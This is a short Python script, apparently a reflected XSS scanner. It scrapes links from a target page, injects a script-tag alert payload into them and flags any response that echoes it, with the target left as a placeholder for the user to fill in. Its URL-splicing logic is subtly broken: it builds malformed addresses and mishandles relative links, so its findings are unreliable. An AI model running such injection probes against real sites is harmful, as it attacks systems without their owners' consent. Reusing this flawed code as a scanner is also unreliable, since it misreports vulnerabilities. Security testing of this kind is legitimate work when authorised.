import re
import requests

def find_xss_vulnerable_urls(url):
    """
    Finds XSS vulnerabilities in the provided URL.
    """
    response = requests.get(url)
    links = re.findall(r'href=[\'"]?([^\'" >]+)', response.text)
    vulnerable_urls = []

    for link in links:
        payload = f'{url}""><script>alert("XSS Vulnerability")</script>'
        modified_link = link.replace(url, payload)
        modified_response = requests.get(modified_link)

        if 'XSS Vulnerability' in modified_response.text:
            vulnerable_urls.append(modified_link)

    return vulnerable_urls

# Example usage:
url = 'http://example.com'  # Replace with your target URL
vulnerable_urls = find_xss_vulnerable_urls(url)

if vulnerable_urls:
    print(f'XSS Vulnerabilities found in the following URLs:')
    for url in vulnerable_urls:
        print(url)
else:
    print('No XSS Vulnerabilities found.')
